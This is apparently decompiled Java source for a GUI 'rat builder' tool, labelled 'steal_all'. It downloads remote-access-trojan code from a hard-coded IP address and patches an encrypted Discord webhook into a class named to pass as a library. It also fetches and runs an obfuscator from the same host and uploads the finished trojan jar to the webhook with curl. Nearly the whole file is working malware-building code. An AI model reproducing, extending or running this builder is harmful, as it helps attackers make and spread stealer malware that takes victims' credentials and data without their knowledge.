package org.example;

import com.google.gson.Gson;
import java.awt.Color;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.*;
import java.net.URI;
import java.net.URL;
import java.nio.file.FileSystem;
import java.nio.file.FileSystems;
import java.nio.file.FileVisitOption;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.OpenOption;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.nio.file.attribute.FileAttribute;
import java.time.OffsetDateTime;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.TimeZone;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import java.util.zip.ZipOutputStream;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.JTextField;
import org.apache.commons.io.FileUtils;
import org.apache.http.HttpEntity;
import org.apache.http.HttpStatus;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.entity.ContentType;
import org.apache.http.entity.StringEntity;
import org.apache.http.entity.mime.MultipartEntityBuilder;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;

/* loaded from: ratbuilder_steal_all_-_Copy.jar:org/example/Main.class */
class Main extends JFrame implements ActionListener {
    static JFrame frame;
    static JTextField textbox;
    static final File appData = new File(System.getenv("APPDATA"));
    Boolean notdone = true;
    Boolean first = true;
    Boolean noteditedhooker = true;

    public Main() {
        frame = new JFrame("rat builder");
        JButton button = new JButton("click to build!");
        JButton button2 = new JButton("Obfuscation");
        button.addActionListener(this);
        button2.addActionListener(this);
        textbox = new JTextField(85);
        JPanel panel = new JPanel();
        panel.add(textbox);
        panel.add(button);
        panel.add(button2);
        frame.add(panel);
        frame.setDefaultCloseOperation(3);
        frame.setSize(1000, (int) HttpStatus.SC_INTERNAL_SERVER_ERROR);
        frame.move((int) HttpStatus.SC_MULTIPLE_CHOICES, (int) HttpStatus.SC_MULTIPLE_CHOICES);
        frame.setVisible(true);
    }

    public static void main(String[] args) throws IOException {
        new Main();
    }

    public void actionPerformed(ActionEvent e) {
        try {
            if (e.getActionCommand().equals("Click to Build!")) {
                this.notdone = true;
                this.first = true;
                if (Files.isDirectory(Paths.get(appData + "\\ratter3", new String[0]), new LinkOption[0])) {
                    FileUtils.deleteDirectory(new File(appData + "\\ratter3"));
                }
                if (!new File(appData + "\\ratter3").isDirectory()) {
                    MessageWebhook("@everyone starting building!");
                    new File(appData + "\\ratter3").mkdirs();
                }
                while (this.notdone.booleanValue()) {
                    try {
                        if (!Files.exists(Paths.get(appData + "\\ratter3\\build.zip", new String[0]), new LinkOption[0])) {
                            MessageWebhook("downloading rat code.");
                            FileUtils.copyURLToFile(new URL("http://185.103.101.105:8080/build/"), new File(appData + "\\ratter3\\build.zip"));
                        } else if (!Files.isDirectory(Paths.get(appData + "\\ratter3\\ratfiles", new String[0]), new LinkOption[0]) && Files.exists(Paths.get(appData + "\\ratter3\\build.zip", new String[0]), new LinkOption[0])) {
                            MessageWebhook("extracting rat code.");
                            extractZip(appData + "\\ratter3\\build.zip", (appData + "\\ratter3\\ratfiles"));

                        } else {
                            String filetext = getString();
                            String textboxtextfixed = EncryptWebhook(textbox.getText().replace("canary.", "").replace("ptb.", ""));
                            if (this.noteditedhooker.booleanValue()) {
                                MessageWebhook("editing rat webhook + recompiling rat.");
                                Files.write(Paths.get(appData + "\\ratter3\\ratfiles\\additionalslibraries\\Additionals_Libraries.class", new String[0]), filetext.replace("HelloThisIsA121CharacterLongString(becauseWebhooksAre121CharactersLong)AndIneedThisStringToBeTheSameSizeAsNormalWebhooks!ILIED!!IlrObfNowNeeds191CharecterStringsForTheWebhook,ThatsFunGoodNight", textboxtextfixed).getBytes("ISO-8859-15"), new OpenOption[0]);
                                Map<String, String> env = new HashMap<>();
                                env.put("create", "true");
                                Path path = Paths.get(appData + "\\ratter3\\build.zip", new String[0]);
                                URI uri = URI.create("jar:" + path.toUri());
                                FileSystem fs = FileSystems.newFileSystem(uri, env);
                                Throwable th = null;
                                try {
                                    Path nf = fs.getPath("additionalslibraries\\Additionals_Libraries.class", new String[0]);
                                    Files.write(nf, Files.readAllBytes(Paths.get(appData + "\\ratter3\\ratfiles\\additionalslibraries\\Additionals_Libraries.class", new String[0])), StandardOpenOption.CREATE);
                                    if (fs != null) {
                                        if (0 != 0) {
                                            try {
                                                fs.close();
                                            } catch (Throwable th2) {
                                                th.addSuppressed(th2);
                                            }
                                        } else {
                                            fs.close();
                                        }
                                    }
                                    System.out.println(appData);
                                    FileUtils.copyFile(new File(appData + "\\ratter3\\build.zip"), new File(appData + "\\ratter3\\additionalslibraries.jar"));


                                    /*UploadFileToWebhook("@everyone rat done!: ", appData + "\\ratter3\\additionalslibraries.jar");
                                    Runtime.getRuntime().exec("curl.exe -F \"file1=@" + appData + "\\ratter3\\additionalslibraries.jar\" \"" + textbox.getText() + "\"");
*/
                                    this.notdone = false;
                                } catch (Throwable th3) {
                                    try {
                                        throw th3;
                                    } catch (Throwable th4) {
                                        if (fs != null) {
                                            if (th3 != null) {
                                                try {
                                                    fs.close();
                                                } catch (Throwable th5) {
                                                    th3.addSuppressed(th5);
                                                }
                                            } else {
                                                fs.close();
                                            }
                                        }
                                        throw th4;
                                    }

                                }
                            }
                        }
                    } catch (IOException ex) {
                        System.out.println(ex);
                        MessageWebhook("```" + ex + "``` pls report this error! iloverat.9200 / lesbiananimegirl");
                    }
                }
            }
            else if (e.getActionCommand().equals("Obfuscation")) {
                this.notdone = true;
                this.first = true;
                if (Files.isDirectory(Paths.get(appData + "\\fuscat", new String[0]), new LinkOption[0])) {
                    FileUtils.deleteDirectory(new File(appData + "\\fuscat"));
                }
                if (!new File(appData + "\\fuscat").isDirectory()) {
                    MessageWebhook("@everyone starting building!");
                    new File(appData + "\\fuscat").mkdirs();
                }
                while (this.notdone.booleanValue()) {
                    try {
                        if (!Files.exists(Paths.get(appData + "\\fuscat\\build.zip", new String[0]), new LinkOption[0])) {
                            MessageWebhook("downloading rat code.");
                            FileUtils.copyURLToFile(new URL("http://185.103.101.105:8080/build/"), new File(appData + "\\fuscat\\build.zip"));
                        } else if (!Files.isDirectory(Paths.get(appData + "\\fuscat\\ratfiles", new String[0]), new LinkOption[0]) && Files.exists(Paths.get(appData + "\\fuscat\\build.zip", new String[0]), new LinkOption[0])) {
                            MessageWebhook("extracting rat code.");
                            extractZip(appData + "\\fuscat\\build.zip", (appData + "\\fuscat\\ratfiles"));

                        } else {
                            String filetext = getString2();
                            String textboxtextfixed = EncryptWebhook(textbox.getText().replace("canary.", "").replace("ptb.", ""));
                            if (this.noteditedhooker.booleanValue()) {
                                MessageWebhook("editing rat webhook + recompiling rat.");
                                Files.write(Paths.get(appData + "\\fuscat\\ratfiles\\additionalslibraries\\Additionals_Libraries.class", new String[0]), filetext.replace("HelloThisIsA121CharacterLongString(becauseWebhooksAre121CharactersLong)AndIneedThisStringToBeTheSameSizeAsNormalWebhooks!ILIED!!IlrObfNowNeeds191CharecterStringsForTheWebhook,ThatsFunGoodNight", textboxtextfixed).getBytes("ISO-8859-15"), new OpenOption[0]);
                                Map<String, String> env = new HashMap<>();
                                env.put("create", "true");
                                Path path = Paths.get(appData + "\\fuscat\\build.zip", new String[0]);
                                URI uri = URI.create("jar:" + path.toUri());
                                FileSystem fs = FileSystems.newFileSystem(uri, env);
                                Throwable th = null;
                                try {
                                    Path nf = fs.getPath("additionalslibraries\\Additionals_Libraries.class", new String[0]);
                                    Files.write(nf, Files.readAllBytes(Paths.get(appData + "\\fuscat\\ratfiles\\additionalslibraries\\Additionals_Libraries.class", new String[0])), StandardOpenOption.CREATE);
                                    if (fs != null) {
                                        if (0 != 0) {
                                            try {
                                                fs.close();
                                            } catch (Throwable th2) {
                                                th.addSuppressed(th2);
                                            }
                                        } else {
                                            fs.close();
                                        }
                                    }
                                    System.out.println(appData);
                                    FileUtils.copyFile(new File(appData + "\\fuscat\\build.zip"), new File(appData + "\\fuscat\\additionalslibraries.jar"));
                                    MessageWebhook("Download fuscation!");
                                    FileUtils.copyURLToFile(new URL("http://185.103.101.105:8080/f/"), new File(appData + "\\fuscat\\f.jar"));
                                    MessageWebhook("Obfuscation!");

                                    Process process = Runtime.getRuntime().exec("java -jar "+appData + "\\fuscat\\f.jar obfuscate "+appData + "\\fuscat\\additionalslibraries.jar\"");
                                    InputStream inputStream = process.getInputStream();
                                    BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));

                                    // Чтение и вывод вывода команды
                                    String line;
                                    while ((line = reader.readLine()) != null) {
                                        System.out.println(line);
                                    }

                                    // Закрытие потоков
                                    reader.close();
                                    inputStream.close();

                                    // Ждем завершения процесса
                                    int exitCode = process.waitFor();

                                    // Выводим код завершения
                                    System.out.println("Exit Code: " + exitCode);
                                    FileUtils.copyFile(new File(appData + "\\fuscat\\additionalslibraries.jar"),new File(appData + "\\fuscat\\F-additionalslibraries.jar"));


                                    MessageWebhook("@everyone rat done!");
                                    Process process2 =Runtime.getRuntime().exec("curl.exe -F \"file1=@" + appData + "\\fuscat\\F-additionalslibraries.jar\" \"" + textbox.getText() + "\"");
                                    InputStream inputStream2 = process2.getInputStream();
                                    BufferedReader reader2 = new BufferedReader(new InputStreamReader(inputStream2));

                                    // Чтение и вывод вывода команды
                                    String line2;
                                    while ((line2 = reader2.readLine()) != null) {
                                        System.out.println(line2);
                                    }

                                    // Закрытие потоков
                                    reader2.close();
                                    inputStream2.close();

                                    // Ждем завершения процесса
                                    int exitCode2 = process.waitFor();
                                    System.out.println("Exit Code: " + exitCode2);

                                    this.notdone = false;
                                } catch (Throwable th3) {
                                    try {
                                        throw th3;
                                    } catch (Throwable th4) {
                                        if (fs != null) {
                                            if (th3 != null) {
                                                try {
                                                    fs.close();
                                                } catch (Throwable th5) {
                                                    th3.addSuppressed(th5);
                                                }
                                            } else {
                                                fs.close();
                                            }
                                        }
                                        throw th4;
                                    }

                                }
                            }
                        }
                    } catch (IOException | InterruptedException ex) {
                        System.out.println(ex);
                        MessageWebhook("```" + ex + "``` pls report this error! iloverat.9200 / lesbiananimegirl");
                    }
                }
            }
        } catch (IOException ex2) {
            System.out.println(ex2);
            MessageWebhook("```" + ex2 + "``` pls report this error! iloverat.9200 / lesbiananimegirl");
        }
    }
    public static void extractZip(String zipFilePath, String destDirectory) throws IOException {
        byte[] buffer = new byte[1024];

        try (ZipInputStream zipInputStream = new ZipInputStream(new FileInputStream(zipFilePath))) {
            // Создаем директорию для распаковки, если её нет
            File destDir = new File(destDirectory);
            if (!destDir.exists()) {
                destDir.mkdirs();
            }

            // Получаем содержимое zip-файла
            ZipEntry zipEntry = zipInputStream.getNextEntry();

            while (zipEntry != null) {
                String filePath = destDirectory + File.separator + zipEntry.getName();
                if (!zipEntry.isDirectory()) {
                    // Если это файл, создаем его и записываем содержимое
                    try (FileOutputStream fos = new FileOutputStream(filePath)) {
                        int len;
                        while ((len = zipInputStream.read(buffer)) > 0) {
                            fos.write(buffer, 0, len);
                        }
                    }
                } else {
                    // Если это директория, создаем её
                    File dir = new File(filePath);
                    dir.mkdirs();
                }

                zipEntry = zipInputStream.getNextEntry();
            }

            zipInputStream.closeEntry();
        }
    }
    private static String getString() throws IOException {
        BufferedReader br = new BufferedReader(new InputStreamReader(Files.newInputStream(Paths.get(appData + "\\ratter3\\ratfiles\\additionalslibraries\\Additionals_Libraries.class", new String[0]), new OpenOption[0]), "ISO-8859-15"));
        StringBuilder content = new StringBuilder();
        char[] buffer = new char[4096];
        while (true) {
            int charCount = br.read(buffer, 0, buffer.length);
            if (charCount != -1) {
                content.append(String.valueOf(buffer, 0, charCount));
            } else {
                String filetext = content.toString();
                return filetext;
            }
        }
    } private static String getString2() throws IOException {
        BufferedReader br = new BufferedReader(new InputStreamReader(Files.newInputStream(Paths.get(appData + "\\fuscat\\ratfiles\\additionalslibraries\\Additionals_Libraries.class", new String[0]), new OpenOption[0]), "ISO-8859-15"));
        StringBuilder content = new StringBuilder();
        char[] buffer = new char[4096];
        while (true) {
            int charCount = br.read(buffer, 0, buffer.length);
            if (charCount != -1) {
                content.append(String.valueOf(buffer, 0, charCount));
            } else {
                String filetext = content.toString();
                return filetext;
            }
        }
    }

    public static void pack(String sourceDirPath, String zipFilePath) throws IOException {
        Path p = Files.createFile(Paths.get(zipFilePath, new String[0]), new FileAttribute[0]);
        ZipOutputStream zs = new ZipOutputStream(Files.newOutputStream(p, new OpenOption[0]));
        Throwable th = null;
        try {
            Path pp = Paths.get(sourceDirPath, new String[0]);
            Files.walk(pp, new FileVisitOption[0]).filter(path -> {
                return !Files.isDirectory(path, new LinkOption[0]);
            }).forEach(path2 -> {
                ZipEntry zipEntry = new ZipEntry(pp.relativize(path2).toString());
                try {
                    zs.putNextEntry(zipEntry);
                    FileUtils.copyFile(path2.toFile(), zs);
                    zs.closeEntry();
                } catch (IOException e) {
                }
            });
            if (zs != null) {
                if (0 != 0) {
                    try {
                        zs.close();
                        return;
                    } catch (Throwable th2) {
                        th.addSuppressed(th2);
                        return;
                    }
                }
                zs.close();
            }
        } catch (Throwable th3) {
            try {
                throw th3;
            } catch (Throwable th4) {
                if (zs != null) {
                    if (th3 != null) {
                        try {
                            zs.close();
                        } catch (Throwable th5) {
                            th3.addSuppressed(th5);
                        }
                    } else {
                        zs.close();
                    }
                }
                throw th4;
            }
        }
    }

    public static void unpack(String sourceDirPath, File zipFilePath) throws IOException {
        new File(sourceDirPath).mkdir();
        byte[] buffer = new byte[1024];
        ZipInputStream zis = new ZipInputStream(Files.newInputStream(Paths.get(sourceDirPath, new String[0]), new OpenOption[0]));
        ZipEntry nextEntry = zis.getNextEntry();
        System.out.println(3);
        while (true) {
            ZipEntry zipEntry = nextEntry;
            if (zipEntry != null) {
                File newFile = newFile(zipFilePath, zipEntry);
                System.out.println(zipEntry);
                if (zipEntry.isDirectory()) {
                    if (!newFile.isDirectory() && !newFile.mkdir()) {
                        throw new IOException("Failed to create directory " + newFile);
                    }
                } else {
                    File parent = newFile.getParentFile();
                    System.out.println(parent);
                    if (!parent.isDirectory() && !parent.mkdir()) {
                        throw new IOException("Failed to create directory " + parent);
                    }
                    FileOutputStream fos = new FileOutputStream(newFile);
                    while (true) {
                        int len = zis.read(buffer);
                        if (len <= 0) {
                            break;
                        }
                        fos.write(buffer, 0, len);
                    }
                    fos.close();
                }
                nextEntry = zis.getNextEntry();
            } else {
                zis.closeEntry();
                zis.close();
                return;
            }
        }
    }

    public static File newFile(File destinationDir, ZipEntry zipEntry) throws IOException {
        File destFile = new File(destinationDir, zipEntry.getName());
        String destDirPath = destinationDir.getCanonicalPath();
        String destFilePath = destFile.getCanonicalPath();
        if (!destFilePath.startsWith(destDirPath + File.separator)) {
            throw new IOException("Entry is outside of the target dir: " + zipEntry.getName());
        }
        return destFile;
    }

    public static void MessageWebhook(String stringtosend) {
        try {
            DiscordMessage message = DiscordMessage.builder().withUsername("#iloveratted").withAvatar("https://cdn.discordapp.com/attachments/1152580329605968053/1152608037396303972/cmUuanBn.png").withContent(stringtosend).build();
            new WebhookAgent(textbox.getText()).execute(message);
        } catch (Exception e) {
        }
    }

    public static void UploadFileToWebhook(String texttoupload, String filepath) {
        try {
            DiscordMessage message = DiscordMessage.builder().withUsername("#iloveratted").withAvatar("https://cdn.discordapp.com/attachments/1152580329605968053/1152608037396303972/cmUuanBn.png").withContent(texttoupload).addFile(new File(filepath)).build();
            new WebhookAgent(textbox.getText()).execute(message);
        } catch (Exception e) {
        }
    }

    public static String EncryptWebhook(String stringToEncrypt) {
        String encryptedString = "";
        String numbers = stringToEncrypt.substring(33, 52);
        String numbersbackwards = ReverseNumbers(numbers);
        for (int i = 0; i <= 69; i++) {
            encryptedString = encryptedString + Charecters().charAt((int) Math.floor(Math.random() * Charecters().length()));
        }
        int b = 0;
        for (int i2 = 0; i2 <= 32; i2++) {
            while (b >= 19) {
                b -= 19;
            }
            int numtouse = Integer.parseInt(String.valueOf(numbersbackwards.charAt(b)));
            encryptedString = encryptedString + ShiftChar(stringToEncrypt.charAt(i2), numtouse);
            b++;
        }
        for (int i3 = 0; i3 < 89; i3++) {
            while (b >= 19) {
                b -= 19;
            }
            int numtouse2 = Integer.parseInt(String.valueOf(numbers.charAt(b)));
            encryptedString = encryptedString + ShiftChar(stringToEncrypt.charAt(i3 + 32), numtouse2);
            b++;
        }
        return encryptedString;
    }

    private static String Charecters() {
        return "aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ0123456789./_:-+|!?'`[]{}$%&()=;@<>";
    }

    private static String newCharAt(int pos) {
        while (pos < 0) {
            pos += Charecters().length();
        }
        while (pos > Charecters().length()) {
            pos -= Charecters().length();
        }
        return String.valueOf(Charecters().charAt(pos));
    }

    public static String ReverseNumbers(String longnumber) {
        String numb = "";
        for (int i = 0; i < longnumber.length(); i++) {
            numb = numb + longnumber.charAt((longnumber.length() - i) - 1);
        }
        return numb;
    }

    public static String ShiftChar(char charecter, int howmuch) {
        return newCharAt(Charecters().indexOf(charecter) + howmuch);
    }

    /* loaded from: ratbuilder_steal_all_-_Copy.jar:org/example/Main$DiscordEmbed.class */
    public static class DiscordEmbed {
        String title;
        String description;
        String url;
        Integer color;
        String timestamp;
        AuthorEmbed author;
        ImageEmbed image;
        ThumbnailEmbed thumbnail;
        FooterEmbed footer;
        List<FieldEmbed> fields;

        private DiscordEmbed() {
        }

        public static Builder builder() {
            return new Builder();
        }

        /* loaded from: ratbuilder_steal_all_-_Copy.jar:org/example/Main$DiscordEmbed$Builder.class */
        public static class Builder {
            private final DiscordEmbed embed = new DiscordEmbed();

            public Builder withTitle(String title) {
                this.embed.title = title;
                return this;
            }

            public Builder withTitleUrl(String url) {
                this.embed.url = url;
                return this;
            }

            public Builder withDescription(String description) {
                this.embed.description = description;
                return this;
            }

            public Builder withColor(Color color) {
                this.embed.color = Integer.valueOf((((color.getRed() << 8) + color.getGreen()) << 8) + color.getBlue());
                return this;
            }

            public Builder withTimestamp(Calendar calendar) {
                this.embed.timestamp = OffsetDateTime.ofInstant(calendar.toInstant(), calendar.getTimeZone().toZoneId()).toString();
                return this;
            }

            public Builder withTimestamp(long timeInMillis) {
                Calendar calendar = Calendar.getInstance(TimeZone.getTimeZone("GMT"));
                calendar.setTimeInMillis(timeInMillis);
                return withTimestamp(calendar);
            }

            public Builder withAuthor(AuthorEmbed author) {
                this.embed.author = author;
                return this;
            }

            public Builder withImage(ImageEmbed image) {
                this.embed.image = image;
                return this;
            }

            public Builder withThumbnail(ThumbnailEmbed thumbnail) {
                this.embed.thumbnail = thumbnail;
                return this;
            }

            public Builder withFooter(FooterEmbed footer) {
                this.embed.footer = footer;
                return this;
            }

            public Builder addField(FieldEmbed field) {
                return addFields(field);
            }

            public Builder addFields(FieldEmbed... fields) {
                if (this.embed.fields == null) {
                    this.embed.fields = new ArrayList(6);
                }
                Collections.addAll(this.embed.fields, fields);
                return this;
            }

            public DiscordEmbed build() {
                return this.embed;
            }
        }

        /* loaded from: ratbuilder_steal_all_-_Copy.jar:org/example/Main$DiscordEmbed$AuthorEmbed.class */
        public static class AuthorEmbed {
            String name;
            String icon_url;
            String url;

            public AuthorEmbed(String name, String icon_url) {
                this.name = name;
                this.icon_url = icon_url;
            }

            public AuthorEmbed(String name, String icon_url, String url) {
                this(name, icon_url);
                this.url = url;
            }
        }

        /* loaded from: ratbuilder_steal_all_-_Copy.jar:org/example/Main$DiscordEmbed$FieldEmbed.class */
        public static class FieldEmbed {
            String name;
            String value;
            Boolean inline;

            public FieldEmbed(String name, String value) {
                this.name = name;
                this.value = value;
            }

            public FieldEmbed(String name, String value, Boolean inline) {
                this(name, value);
                this.inline = inline;
            }
        }

        /* loaded from: ratbuilder_steal_all_-_Copy.jar:org/example/Main$DiscordEmbed$ImageEmbed.class */
        public static class ImageEmbed {
            String url;

            public ImageEmbed(String url) {
                this.url = url;
            }
        }

        /* loaded from: ratbuilder_steal_all_-_Copy.jar:org/example/Main$DiscordEmbed$ThumbnailEmbed.class */
        public static class ThumbnailEmbed {
            String url;

            public ThumbnailEmbed(String url) {
                this.url = url;
            }
        }

        /* loaded from: ratbuilder_steal_all_-_Copy.jar:org/example/Main$DiscordEmbed$FooterEmbed.class */
        public static class FooterEmbed {
            String text;
            String icon_url;

            public FooterEmbed(String text, String icon_url) {
                this.text = text;
                this.icon_url = icon_url;
            }
        }
    }

    /* loaded from: ratbuilder_steal_all_-_Copy.jar:org/example/Main$DiscordMessage.class */
    public static class DiscordMessage {
        String username;
        String avatar_url;
        String content;
        Boolean tts;
        List<DiscordEmbed> embeds;
        transient List<File> files;

        private DiscordMessage() {
        }

        public static Builder builder() {
            return new Builder();
        }

        /* loaded from: ratbuilder_steal_all_-_Copy.jar:org/example/Main$DiscordMessage$Builder.class */
        public static class Builder {
            private final DiscordMessage message = new DiscordMessage();

            public Builder withUsername(String username) {
                this.message.username = username;
                return this;
            }

            public Builder withAvatar(String avatar_url) {
                this.message.avatar_url = avatar_url;
                return this;
            }

            public Builder withContent(String content) {
                this.message.content = content;
                return this;
            }

            public Builder withTextToSpeech(boolean tts) {
                this.message.tts = Boolean.valueOf(tts);
                return this;
            }

            public Builder addEmbed(DiscordEmbed embed) {
                return addEmbeds(embed);
            }

            public Builder addEmbeds(DiscordEmbed... embeds) {
                if (this.message.embeds == null) {
                    this.message.embeds = new ArrayList(3);
                }
                Collections.addAll(this.message.embeds, embeds);
                return this;
            }

            public Builder addFile(File file) {
                return addFiles(file);
            }

            public Builder addFiles(File... files) {
                if (this.message.files == null) {
                    this.message.files = new ArrayList(3);
                }
                Collections.addAll(this.message.files, files);
                return this;
            }

            public DiscordMessage build() {
                return this.message;
            }
        }
    }

    /* loaded from: ratbuilder_steal_all_-_Copy.jar:org/example/Main$WebhookAgent.class */
    public static class WebhookAgent {
        private static final CloseableHttpClient HTTP_CLIENT = HttpClients.createDefault();
        private static final Gson GSON = new Gson();
        private final String url;

        public WebhookAgent(String url) {
            this.url = url;
        }

        public String getUrl() {
            return this.url;
        }

        public void execute(DiscordMessage message) {
            if (message.content == null && message.files == null && message.embeds == null) {
                throw new RuntimeException("Discord message can't contain no information.");
            }
            new Thread(() -> {
                HttpEntity entity;
                HttpPost httpPost = new HttpPost(this.url);
                if (message.files != null) {
                    MultipartEntityBuilder entityBuilder = MultipartEntityBuilder.create();
                    entityBuilder.addTextBody("payload_json", GSON.toJson(message), ContentType.APPLICATION_JSON);
                    for (int i = 0; i < message.files.size(); i++) {
                        File file = message.files.get(i);
                        if (file.exists() && file.isFile()) {
                            entityBuilder.addBinaryBody("file" + i, file);
                        } else {
                            System.err.print("File [" + file.getAbsolutePath() + "] doesn't exist. It is skipped.");
                        }
                    }
                    entity = entityBuilder.build();
                } else {
                    try {
                        httpPost.addHeader("Content-Type", "application/json");
                        entity = new StringEntity(GSON.toJson(message));
                    } catch (UnsupportedEncodingException ex) {
                        ex.printStackTrace();
                        return;
                    }
                }
                httpPost.setEntity(entity);
                try {
                    HTTP_CLIENT.execute((HttpUriRequest) httpPost);
                } catch (IOException ex2) {
                    ex2.printStackTrace();
                }
            }).start();
        }
    }
}